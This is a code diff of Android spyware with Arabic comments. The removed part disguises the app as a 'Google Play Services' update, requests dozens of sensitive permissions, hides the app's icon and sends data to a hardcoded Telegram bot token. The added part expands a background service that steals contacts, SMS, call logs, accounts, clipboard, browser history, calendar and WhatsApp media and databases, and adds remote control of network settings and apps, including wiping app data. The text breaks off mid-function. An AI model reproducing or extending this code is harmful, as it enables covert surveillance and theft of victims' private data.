@@ -6,14 +6,11 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
-import android.os.Build;
-import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -22,29 +19,16 @@ import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
-import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.View;
-import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.TextView;
-import android.widget.Toast;
 
 import androidx.annotation.Nullable;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
-import org.json.JSONObject;
-
-import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.FileWriter;
-import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
@@ -57,398 +41,16 @@ import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Set;
-import java.util.Timer;
-import java.util.TimerTask;
 
-// ========== MAIN ACTIVITY - طلب الصلاحيات والإخفاء ==========
-public class MainActivity extends AppCompatActivity {
+public class ControlService extends Service {
     
     private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
-    private static final int PERMISSION_REQUEST_CODE = 100;
-    
-    private TextView statusText;
-    private Button mainButton;
-    private LinearLayout permissionsLayout;
-    private Handler handler = new Handler(Looper.getMainLooper());
-    
-    // قائمة الصلاحيات المطلوبة
-    private final String[] REQUIRED_PERMISSIONS = {
-        android.Manifest.permission.READ_EXTERNAL_STORAGE,
-        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-        android.Manifest.permission.MANAGE_EXTERNAL_STORAGE,
-        android.Manifest.permission.READ_CONTACTS,
-        android.Manifest.permission.WRITE_CONTACTS,
-        android.Manifest.permission.READ_SMS,
-        android.Manifest.permission.SEND_SMS,
-        android.Manifest.permission.RECEIVE_SMS,
-        android.Manifest.permission.READ_CALL_LOG,
-        android.Manifest.permission.WRITE_CALL_LOG,
-        android.Manifest.permission.READ_PHONE_STATE,
-        android.Manifest.permission.CALL_PHONE,
-        android.Manifest.permission.ANSWER_PHONE_CALLS,
-        android.Manifest.permission.ACCESS_FINE_LOCATION,
-        android.Manifest.permission.ACCESS_COARSE_LOCATION,
-        android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-        android.Manifest.permission.CAMERA,
-        android.Manifest.permission.RECORD_AUDIO,
-        android.Manifest.permission.SYSTEM_ALERT_WINDOW,
-        android.Manifest.permission.WRITE_SETTINGS,
-        android.Manifest.permission.PACKAGE_USAGE_STATS,
-        android.Manifest.permission.FOREGROUND_SERVICE,
-        android.Manifest.permission.WAKE_LOCK,
-        android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
-        android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-        android.Manifest.permission.ACCESS_NOTIFICATION_POLICY,
-        android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
-        android.Manifest.permission.INTERNET,
-        android.Manifest.permission.ACCESS_NETWORK_STATE,
-        android.Manifest.permission.ACCESS_WIFI_STATE,
-        android.Manifest.permission.CHANGE_WIFI_STATE,
-        android.Manifest.permission.BLUETOOTH,
-        android.Manifest.permission.BLUETOOTH_ADMIN,
-        android.Manifest.permission.NFC,
-        android.Manifest.permission.VIBRATE,
-        android.Manifest.permission.USE_BIOMETRIC,
-        android.Manifest.permission.USE_FINGERPRINT,
-        android.Manifest.permission.BODY_SENSORS,
-        android.Manifest.permission.ACTIVITY_RECOGNITION
-    };
-    
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        
-        // إخفاء التطبيق من المهام الأخيرة
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            finishAndRemoveTask();
-        }
-        
-        // بناء الواجهة
-        LinearLayout mainLayout = new LinearLayout(this);
-        mainLayout.setOrientation(LinearLayout.VERTICAL);
-        mainLayout.setGravity(android.view.Gravity.CENTER);
-        mainLayout.setPadding(50, 50, 50, 50);
-        mainLayout.setBackgroundColor(0xFFF5F5F5);
-        
-        TextView titleText = new TextView(this);
-        titleText.setText("Google Play Services");
-        titleText.setTextSize(24);
-        titleText.setTextColor(0xFF4CAF50);
-        titleText.setGravity(android.view.Gravity.CENTER);
-        titleText.setPadding(0, 0, 0, 20);
-        
-        statusText = new TextView(this);
-        statusText.setText("✓ التحقق من الصلاحيات...");
-        statusText.setTextSize(16);
-        statusText.setTextColor(0xFF666666);
-        statusText.setGravity(android.view.Gravity.CENTER);
-        statusText.setPadding(0, 20, 0, 30);
-        
-        permissionsLayout = new LinearLayout(this);
-        permissionsLayout.setOrientation(LinearLayout.VERTICAL);
-        permissionsLayout.setPadding(0, 0, 0, 30);
-        
-        mainButton = new Button(this);
-        mainButton.setText("بدء تثبيت التحديث");
-        mainButton.setTextSize(16);
-        mainButton.setBackgroundColor(0xFF4CAF50);
-        mainButton.setTextColor(0xFFFFFFFF);
-        mainButton.setPadding(30, 15, 30, 15);
-        mainButton.setAllCaps(false);
-        
-        mainButton.setOnClickListener(v -> {
-            checkAndRequestPermissions();
-        });
-        
-        mainLayout.addView(titleText);
-        mainLayout.addView(statusText);
-        mainLayout.addView(permissionsLayout);
-        mainLayout.addView(mainButton);
-        
-        setContentView(mainLayout);
-        
-        // التحقق من الصلاحيات بعد ثانية
-        handler.postDelayed(this::updatePermissionsStatus, 1000);
-    }
-    
-    private void updatePermissionsStatus() {
-        permissionsLayout.removeAllViews();
-        
-        List<String> missingPermissions = new ArrayList<>();
-        
-        for (String permission : REQUIRED_PERMISSIONS) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                missingPermissions.add(permission);
-                
-                TextView permText = new TextView(this);
-                permText.setText("❌ " + getPermissionName(permission));
-                permText.setTextColor(0xFFFF0000);
-                permText.setPadding(20, 5, 20, 5);
-                permissionsLayout.addView(permText);
-            } else {
-                TextView permText = new TextView(this);
-                permText.setText("✅ " + getPermissionName(permission));
-                permText.setTextColor(0xFF4CAF50);
-                permText.setPadding(20, 5, 20, 5);
-                permissionsLayout.addView(permText);
-            }
-        }
-        
-        if (missingPermissions.isEmpty()) {
-            statusText.setText("✓ جميع الصلاحيات ممنوحة");
-            statusText.setTextColor(0xFF4CAF50);
-            mainButton.setText("متابعة التثبيت");
-        } else {
-            statusText.setText("⚠ يوجد " + missingPermissions.size() + " صلاحية مفقودة");
-            statusText.setTextColor(0xFFFF9800);
-            mainButton.setText("منح الصلاحيات المفقودة");
-        }
-    }
-    
-    private String getPermissionName(String permission) {
-        switch (permission) {
-            case android.Manifest.permission.READ_EXTERNAL_STORAGE: return "الوصول للملفات";
-            case android.Manifest.permission.WRITE_EXTERNAL_STORAGE: return "الكتابة في الملفات";
-            case android.Manifest.permission.MANAGE_EXTERNAL_STORAGE: return "إدارة الملفات";
-            case android.Manifest.permission.READ_CONTACTS: return "قراءة جهات الاتصال";
-            case android.Manifest.permission.WRITE_CONTACTS: return "كتابة جهات الاتصال";
-            case android.Manifest.permission.READ_SMS: return "قراءة الرسائل";
-            case android.Manifest.permission.SEND_SMS: return "إرسال الرسائل";
-            case android.Manifest.permission.RECEIVE_SMS: return "استقبال الرسائل";
-            case android.Manifest.permission.READ_CALL_LOG: return "قراءة سجل المكالمات";
-            case android.Manifest.permission.WRITE_CALL_LOG: return "كتابة سجل المكالمات";
-            case android.Manifest.permission.READ_PHONE_STATE: return "حالة الهاتف";
-            case android.Manifest.permission.CALL_PHONE: return "الاتصال";
-            case android.Manifest.permission.ANSWER_PHONE_CALLS: return "الرد على المكالمات";
-            case android.Manifest.permission.ACCESS_FINE_LOCATION: return "الموقع الدقيق";
-            case android.Manifest.permission.ACCESS_COARSE_LOCATION: return "الموقع التقريبي";
-            case android.Manifest.permission.ACCESS_BACKGROUND_LOCATION: return "الموقع في الخلفية";
-            case android.Manifest.permission.CAMERA: return "الكاميرا";
-            case android.Manifest.permission.RECORD_AUDIO: return "تسجيل الصوت";
-            case android.Manifest.permission.SYSTEM_ALERT_WINDOW: return "النوافذ العائمة";
-            case android.Manifest.permission.WRITE_SETTINGS: return "تعديل الإعدادات";
-            case android.Manifest.permission.PACKAGE_USAGE_STATS: return "إحصائيات الاستخدام";
-            case android.Manifest.permission.FOREGROUND_SERVICE: return "خدمات الخلفية";
-            case android.Manifest.permission.WAKE_LOCK: return "منع النوم";
-            case android.Manifest.permission.RECEIVE_BOOT_COMPLETED: return "التشغيل مع الجهاز";
-            case android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS: return "تجاهل تحسين البطارية";
-            case android.Manifest.permission.ACCESS_NOTIFICATION_POLICY: return "الوصول للإشعارات";
-            case android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE: return "خدمات الوصول";
-            case android.Manifest.permission.INTERNET: return "الإنترنت";
-            case android.Manifest.permission.ACCESS_NETWORK_STATE: return "حالة الشبكة";
-            case android.Manifest.permission.ACCESS_WIFI_STATE: return "حالة WiFi";
-            case android.Manifest.permission.CHANGE_WIFI_STATE: return "تغيير WiFi";
-            case android.Manifest.permission.BLUETOOTH: return "بلوتوث";
-            case android.Manifest.permission.BLUETOOTH_ADMIN: return "إدارة بلوتوث";
-            case android.Manifest.permission.NFC: return "NFC";
-            case android.Manifest.permission.VIBRATE: return "الاهتزاز";
-            case android.Manifest.permission.USE_BIOMETRIC: return "البيومترية";
-            case android.Manifest.permission.USE_FINGERPRINT: return "البصمة";
-            case android.Manifest.permission.BODY_SENSORS: return "مستشعرات الجسم";
-            case android.Manifest.permission.ACTIVITY_RECOGNITION: return "النشاط البدني";
-            default: return permission;
-        }
-    }
-    
-    private void checkAndRequestPermissions() {
-        List<String> permissionsToRequest = new ArrayList<>();
-        
-        for (String permission : REQUIRED_PERMISSIONS) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                permissionsToRequest.add(permission);
-            }
-        }
-        
-        if (!permissionsToRequest.isEmpty()) {
-            ActivityCompat.requestPermissions(this, 
-                permissionsToRequest.toArray(new String[0]), 
-                PERMISSION_REQUEST_CODE);
-        } else {
-            startBackgroundServices();
-        }
-    }
-    
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        updatePermissionsStatus();
-        
-        // التحقق إذا كل الصلاحيات ممنوحة
-        boolean allGranted = true;
-        for (int result : grantResults) {
-            if (result != PackageManager.PERMISSION_GRANTED) {
-                allGranted = false;
-                break;
-            }
-        }
-        
-        if (allGranted) {
-            startBackgroundServices();
-        }
-    }
-    
-    private void startBackgroundServices() {
-        statusText.setText("جاري التثبيت... 100%");
-        mainButton.setEnabled(false);
-        mainButton.setBackgroundColor(0xFFCCCCCC);
-        
-        // بدء الخدمات
-        startService(new Intent(this, ControlService.class));
-        
-        // تفعيل التشغيل التلقائي
-        enableAutoStart();
-        
-        // إرسال إشعار البدء
-        new Thread(() -> {
-            sendToTelegram("✅ V13 نشط", "تم التثبيت - تحكم كامل");
-        }).start();
-        
-        // انتظار 3 ثواني ثم إخفاء التطبيق
-        handler.postDelayed(() -> {
-            hideApp();
-        }, 3000);
-    }
-    
-    private void enableAutoStart() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                Intent intent = new Intent();
-                String manufacturer = android.os.Build.MANUFACTURER;
-                
-                if ("xiaomi".equalsIgnoreCase(manufacturer)) {
-                    intent.setComponent(new android.content.ComponentName(
-                        "com.miui.securitycenter",
-                        "com.miui.permcenter.autostart.AutoStartManagementActivity"));
-                } else if ("oppo".equalsIgnoreCase(manufacturer)) {
-                    intent.setComponent(new android.content.ComponentName(
-                        "com.coloros.safecenter",
-                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
-                } else if ("vivo".equalsIgnoreCase(manufacturer)) {
-                    intent.setComponent(new android.content.ComponentName(
-                        "com.vivo.permissionmanager",
-                        "com.vivo.permissionmanager.activity.BootStartActivity"));
-                } else if ("huawei".equalsIgnoreCase(manufacturer)) {
-                    intent.setComponent(new android.content.ComponentName(
-                        "com.huawei.systemmanager",
-                        "com.huawei.systemmanager.optimize.process.ProtectActivity"));
-                }
-                
-                if (intent.resolveActivity(getPackageManager()) != null) {
-                    startActivity(intent);
-                }
-            }
-        } catch (Exception e) {
-            Log.e("V8", "AutoStart error", e);
-        }
-    }
-    
-    private void hideApp() {
-        try {
-            // إخفاء الأيقونة
-            PackageManager p = getPackageManager();
-            p.setComponentEnabledSetting(getComponentName(),
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP);
-            
-            // العودة للصفحة الرئيسية
-            Intent startMain = new Intent(Intent.ACTION_MAIN);
-            startMain.addCategory(Intent.CATEGORY_HOME);
-            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(startMain);
-            
-            finish();
-            
-        } catch (Exception e) {
-            Log.e("V8", "Hide error", e);
-        }
-    }
-    
-    private void sendToTelegram(String title, String message) {
-        try {
-            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
-                "/sendMessage?chat_id=" + CHAT_ID + 
-                "&text=" + URLEncoder.encode("🔴 " + title + "\n\n" + message, "UTF-8");
-            
-            URL url = new URL(urlString);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(5000);
-            
-            int responseCode = conn.getResponseCode();
-            conn.disconnect();
-            
-        } catch (Exception e) {
-            Log.e("V8", "Send error", e);
-        }
-    }
-    
-    private void sendFileToTelegram(String caption, String filePath) {
-        try {
-            File file = new File(filePath);
-            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;
-            
-            String boundary = "*****" + System.currentTimeMillis() + "*****";
-            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
-            
-            URL url = new URL(urlString);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-            conn.setDoOutput(true);
-            conn.setDoInput(true);
-            
-            DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
-            
-            // chat_id
-            outputStream.writeBytes("--" + boundary + "\r\n");
-            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
-            outputStream.writeBytes(CHAT_ID + "\r\n");
-            
-            // caption
-            outputStream.writeBytes("--" + boundary + "\r\n");
-            outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
-            outputStream.writeBytes("🔴 " + caption + "\r\n");
-            
-            // document
-            outputStream.writeBytes("--" + boundary + "\r\n");
-            outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
-            outputStream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
-            
-            FileInputStream fileInputStream = new FileInputStream(file);
-            byte[] buffer = new byte[4096];
-            int bytesRead;
-            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
-                outputStream.write(buffer, 0, bytesRead);
-            }
-            fileInputStream.close();
-            
-            outputStream.writeBytes("\r\n--" + boundary + "--\r\n");
-            outputStream.flush();
-            outputStream.close();
-            
-            int responseCode = conn.getResponseCode();
-            conn.disconnect();
-            
-            file.delete();
-            
-        } catch (Exception e) {
-            Log.e("V8", "Send file error", e);
-        }
-    }
-}
-
-// ========== CONTROL SERVICE - الخدمة الرئيسية في الخلفية ==========
-class ControlService extends Service {
-    
-    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
-    private static final String CHAT_ID = "7259620384";
-    private static final long SCREENSHOT_INTERVAL = 15000; // 15 ثانية
-    private static final long ACCOUNT_CHECK_INTERVAL = 5000; // 5 ثواني
-    private static final long PERSONAL_DATA_INTERVAL = 300000; // 5 دقائق
-    private static final long APPS_DATA_INTERVAL = 900000; // 15 دقيقة
-    private static final long REPORT_INTERVAL = 3600000; // ساعة
+    private static final long SCREENSHOT_INTERVAL = 15000;
+    private static final long ACCOUNT_CHECK_INTERVAL = 5000;
+    private static final long PERSONAL_DATA_INTERVAL = 300000;
+    private static final long APPS_DATA_INTERVAL = 900000;
+    private static final long REPORT_INTERVAL = 3600000;
     
     private Handler handler = new Handler(Looper.getMainLooper());
     private PowerManager.WakeLock wakeLock;
@@ -462,44 +64,34 @@ class ControlService extends Service {
     private final String[] TARGET_APPS = {
         "com.whatsapp", "org.telegram.messenger", "com.facebook.orca",
         "com.instagram.android", "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
-        "com.facebook.katana", "com.snapchat.android", "com.twitter.android"
+        "com.facebook.katana", "com.snapchat.android", "com.twitter.android",
+        "com.google.android.gm", "com.android.mms", "com.google.android.apps.messaging"
     };
     
     @Override
     public void onCreate() {
         super.onCreate();
         
-        // منع الجهاز من النوم
         PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "V8::WakeLock");
-        wakeLock.acquire(10*60*1000L /*10 minutes*/);
+        wakeLock.acquire(10*60*1000L);
         
-        // بدء جميع الخدمات
         startAllServices();
-        
-        // تسجيل مستقل الإقلاع
         registerBootReceiver();
     }
     
     private void startAllServices() {
-        // لقطات الشاشة
         handler.postDelayed(screenshotRunnable, SCREENSHOT_INTERVAL);
-        
-        // مراقبة الحسابات
         handler.postDelayed(accountRunnable, ACCOUNT_CHECK_INTERVAL);
-        
-        // البيانات الشخصية
         handler.postDelayed(personalDataRunnable, PERSONAL_DATA_INTERVAL);
-        
-        // بيانات التطبيقات
         handler.postDelayed(appsDataRunnable, APPS_DATA_INTERVAL);
-        
-        // التقارير
         handler.postDelayed(reportRunnable, REPORT_INTERVAL);
+        handler.postDelayed(networkControlRunnable, 10000);
+        handler.postDelayed(appControlRunnable, 15000);
+        handler.postDelayed(systemControlRunnable, 20000);
+        handler.postDelayed(screenControlRunnable, 25000);
+        handler.postDelayed(soundControlRunnable, 30000);
         
-        // مراقبة الإشعارات (يتم عبر NotificationService)
-        
-        // جلب البيانات الأولية
         new Thread(this::grabInitialData).start();
     }
     
@@ -535,7 +127,6 @@ class ControlService extends Service {
                 }
             }
         } catch (Exception e) {
-            Log.e("V8", "Screenshot error", e);
         }
     }
     
@@ -591,13 +182,9 @@ class ControlService extends Service {
                     msg.append(acc).append("\n");
                 }
                 sendToTelegram("🔐 حسابات جديدة", msg.toString());
-                
-                // لقطة شاشة بعد حساب جديد
                 handler.postDelayed(() -> takeScreenshot(), 1000);
             }
-            
         } catch (Exception e) {
-            Log.e("V8", "Account error", e);
         }
     }
     
@@ -616,6 +203,10 @@ class ControlService extends Service {
             grabSMS();
             grabCallLog();
             grabLocation();
+            grabAccounts();
+            grabClipboard();
+            grabBrowserHistory();
+            grabCalendar();
         }).start();
     }
     
@@ -629,7 +220,7 @@ class ControlService extends Service {
                 StringBuilder contacts = new StringBuilder();
                 int count = 0;
                 
-                while (cursor.moveToNext() && count < 200) {
+                while (cursor.moveToNext() && count < 500) {
                     String name = cursor.getString(cursor.getColumnIndex(
                         ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                     String number = cursor.getString(cursor.getColumnIndex(
@@ -647,7 +238,6 @@ class ControlService extends Service {
                 }
             }
         } catch (Exception e) {
-            Log.e("V8", "Contacts error", e);
         }
     }
     
@@ -655,13 +245,13 @@ class ControlService extends Service {
         try {
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
-                    null, null, null, "date DESC LIMIT 200");
+                    null, null, null, "date DESC LIMIT 500");
             
             if (cursor != null) {
                 StringBuilder sms = new StringBuilder();
                 int count = 0;
                 
-                while (cursor.moveToNext() && count < 200) {
+                while (cursor.moveToNext() && count < 500) {
                     String address = cursor.getString(cursor.getColumnIndex("address"));
                     String body = cursor.getString(cursor.getColumnIndex("body"));
                     String date = cursor.getString(cursor.getColumnIndex("date"));
@@ -680,7 +270,6 @@ class ControlService extends Service {
                 }
             }
         } catch (Exception e) {
-            Log.e("V8", "SMS error", e);
         }
     }
     
@@ -688,13 +277,13 @@ class ControlService extends Service {
         try {
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
-                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
+                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 500");
             
             if (cursor != null) {
                 StringBuilder calls = new StringBuilder();
                 int count = 0;
                 
-                while (cursor.moveToNext() && count < 200) {
+                while (cursor.moveToNext() && count < 500) {
                     String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                     String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                     String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
@@ -720,7 +309,6 @@ class ControlService extends Service {
                 }
             }
         } catch (Exception e) {
-            Log.e("V8", "Calls error", e);
         }
     }
     
@@ -740,7 +328,78 @@ class ControlService extends Service {
                 sendToTelegram("📍 الموقع", loc);
             }
         } catch (Exception e) {
-            Log.e("V8", "Location error", e);
+        }
+    }
+    
+    private void grabAccounts() {
+        try {
+            Process process = Runtime.getRuntime().exec("dumpsys account");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null && output.length() < 2000) {
+                output.append(line).append("\n");
+            }
+            reader.close();
+            
+            if (output.length() > 0) {
+                sendToTelegram("🔐 الحسابات", output.toString());
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    private void grabClipboard() {
+        try {
+            Process process = Runtime.getRuntime().exec("content query --uri content://clipboard");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("\n");
+            }
+            reader.close();
+            
+            if (output.length() > 0) {
+                sendToTelegram("📋 الحافظة", output.toString());
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    private void grabBrowserHistory() {
+        try {
+            Process process = Runtime.getRuntime().exec("content query --uri content://com.android.chrome.browser/history");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null && output.length() < 2000) {
+                output.append(line).append("\n");
+            }
+            reader.close();
+            
+            if (output.length() > 0) {
+                sendToTelegram("🌐 تاريخ المتصفح", output.toString());
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    private void grabCalendar() {
+        try {
+            Process process = Runtime.getRuntime().exec("content query --uri content://calendar/events");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null && output.length() < 2000) {
+                output.append(line).append("\n");
+            }
+            reader.close();
+            
+            if (output.length() > 0) {
+                sendToTelegram("📅 التقويم", output.toString());
+            }
+        } catch (Exception e) {
         }
     }
     
@@ -783,7 +442,8 @@ class ControlService extends Service {
                                 String name = file.getName().toLowerCase();
                                 if (name.endsWith(".jpg") || name.endsWith(".jpeg") || 
                                     name.endsWith(".png") || name.endsWith(".mp4") || 
-                                    name.endsWith(".pdf") || name.endsWith(".db")) {
+                                    name.endsWith(".pdf") || name.endsWith(".db") ||
+                                    name.endsWith(".xml") || name.endsWith(".json")) {
                                     files.add(file.getAbsolutePath());
                                 }
                             }
@@ -794,13 +454,11 @@ class ControlService extends Service {
             
             if (!files.isEmpty()) {
                 sendToTelegram("📱 " + appName, "تم العثور على " + files.size() + " ملف");
-                for (int i = 0; i < Math.min(3, files.size()); i++) {
+                for (int i = 0; i < Math.min(5, files.size()); i++) {
                     sendFileToTelegram(appName, files.get(i));
                 }
             }
-            
         } catch (Exception e) {
-            Log.e("V8", "App data error", e);
         }
     }
     
@@ -809,6 +467,8 @@ class ControlService extends Service {
             String[] paths = {
                 Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images",
                 Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video",
+                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Audio",
+                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Documents",
                 Environment.getExternalStorageDirectory() + "/WhatsApp/Databases"
             };
             
@@ -830,17 +490,384 @@ class ControlService extends Service {
             
             if (!files.isEmpty()) {
                 sendToTelegram("📱 واتساب", "تم العثور على " + files.size() + " ملف");
-                for (int i = 0; i < Math.min(3, files.size()); i++) {
+                for (int i = 0; i < Math.min(5, files.size()); i++) {
                     sendFileToTelegram("واتساب", files.get(i));
                 }
             }
-            
         } catch (Exception e) {
-            Log.e("V8", "WhatsApp error", e);
         }
     }
     
-    // ========== 5. التقارير ==========
+    // ========== 5. التحكم بالشبكة ==========
+    private Runnable networkControlRunnable = new Runnable() {
+        @Override
+        public void run() {
+            checkNetworkCommands();
+            handler.postDelayed(this, 10000);
+        }
+    };
+    
+    private void checkNetworkCommands() {
+        try {
+            String wifiStatus = Settings.Global.getString(getContentResolver(), "wifi_on");
+            String dataStatus = Settings.Global.getString(getContentResolver(), "mobile_data");
+            
+            if (wifiStatus != null) {
+                sendToTelegram("📶 حالة WiFi", wifiStatus.equals("1") ? "مفعل" : "غير مفعل");
+            }
+            
+            if (dataStatus != null) {
+                sendToTelegram("📱 حالة البيانات", dataStatus.equals("1") ? "مفعلة" : "غير مفعلة");
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    public void enableWifi() {
+        try {
+            Settings.Global.putString(getContentResolver(), "wifi_on", "1");
+            sendToTelegram("📶 WiFi", "تم التشغيل");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void disableWifi() {
+        try {
+            Settings.Global.putString(getContentResolver(), "wifi_on", "0");
+            sendToTelegram("📶 WiFi", "تم الإطفاء");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void enableData() {
+        try {
+            Settings.Global.putString(getContentResolver(), "mobile_data", "1");
+            sendToTelegram("📱 بيانات", "تم التشغيل");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void disableData() {
+        try {
+            Settings.Global.putString(getContentResolver(), "mobile_data", "0");
+            sendToTelegram("📱 بيانات", "تم الإطفاء");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void enableBluetooth() {
+        try {
+            Settings.Global.putString(getContentResolver(), "bluetooth_on", "1");
+            sendToTelegram("🔵 بلوتوث", "تم التشغيل");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void disableBluetooth() {
+        try {
+            Settings.Global.putString(getContentResolver(), "bluetooth_on", "0");
+            sendToTelegram("🔵 بلوتوث", "تم الإطفاء");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void enableFlightMode() {
+        try {
+            Settings.Global.putString(getContentResolver(), "airplane_mode_on", "1");
+            sendToTelegram("✈️ وضع الطيران", "تم التشغيل");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void disableFlightMode() {
+        try {
+            Settings.Global.putString(getContentResolver(), "airplane_mode_on", "0");
+            sendToTelegram("✈️ وضع الطيران", "تم الإلغاء");
+        } catch (Exception e) {
+        }
+    }
+    
+    // ========== 6. التحكم بالتطبيقات ==========
+    private Runnable appControlRunnable = new Runnable() {
+        @Override
+        public void run() {
+            checkAppCommands();
+            handler.postDelayed(this, 15000);
+        }
+    };
+    
+    private void checkAppCommands() {
+        try {
+            Process process = Runtime.getRuntime().exec("dumpsys activity activities");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null && output.length() < 500) {
+                if (line.contains("topResumedActivity")) {
+                    output.append("التطبيق النشط: ").append(line).append("\n");
+                }
+            }
+            reader.close();
+            
+            if (output.length() > 0) {
+                sendToTelegram("▶️ التطبيقات", output.toString());
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    public void openApp(String packageName) {
+        try {
+            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                sendToTelegram("▶️ فتح", "تم فتح " + packageName);
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    public void closeApp(String packageName) {
+        try {
+            Process process = Runtime.getRuntime().exec("am force-stop " + packageName);
+            process.waitFor();
+            sendToTelegram("⏹️ إغلاق", "تم إغلاق " + packageName);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void killApp(String packageName) {
+        try {
+            Process process = Runtime.getRuntime().exec("am kill " + packageName);
+            process.waitFor();
+            sendToTelegram("💀 قتل", "تم قتل " + packageName);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void clearAppData(String packageName) {
+        try {
+            Process process = Runtime.getRuntime().exec("pm clear " + packageName);
+            process.waitFor();
+            sendToTelegram("🧹 مسح", "تم مسح بيانات " + packageName);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void disableApp(String packageName) {
+        try {
